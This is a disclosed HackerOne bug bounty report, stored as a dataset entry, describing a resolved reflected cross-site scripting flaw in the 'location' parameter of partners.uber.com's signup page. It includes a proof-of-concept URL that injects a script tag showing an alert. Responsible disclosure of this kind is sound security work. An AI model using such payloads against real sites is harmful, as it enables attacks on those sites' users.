---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '42393'
original_report_id: '42393'
title: XSS on partners.uber.com
weakness: Cross-site Scripting (XSS) - Generic
team_handle: uber
created_at: '2015-01-03T11:59:17.348Z'
disclosed_at: '2016-03-24T22:01:00.572Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 4
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# XSS on partners.uber.com

## Metadata

- HackerOne Report ID: 42393
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: uber
- Disclosed At: 2016-03-24T22:01:00.572Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hello,

I have discovered a reflected XSS on partners.uber.com 

When accessing https://partners.uber.com/signup/global/ with the appropriate parameters, for example: https://partners.uber.com/signup/global/?referrer_uuid=21f5fbbd-b79f-4a16-9976-01096fb556c7&place_id=ChIJPaCKh-tmA4wR7JEkNDrNDSU&utm_source=twitter&location=Carolina%2C+Carolina%2C+Puerto+Rico&lat=18.3807819&lng=-65.95738719999997 in a browser where the page has not been accessed previously in the current session (no session cookie on partners.uber.com), the GET-parameter ```location``` is reflected in the page without validation/sanitation.

POC (tested with Firefox 34.0):
https://partners.uber.com/signup/global/?place_id=ChIJPaCKh-tmA4wR7JEkNDrNDSU&location=Carolina<script>alert(1)</script>a%2C+Carolina"%2C+Puerto+Rico&lat=18.3807819&lng=-65.95738719999997

The best,
Simon

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
